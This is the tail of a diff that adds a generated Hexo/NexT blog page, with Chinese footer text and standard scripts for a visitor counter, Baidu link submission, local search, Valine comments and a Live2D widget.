+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='120' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: '0eYM2A8pUSnA2EEyrujClGRN-MdYXbMMI',
+    appKey: 'BJmUYA3jJHocnfnm4LpPR9Ow',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname
+  });
+}, window.Valine);
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
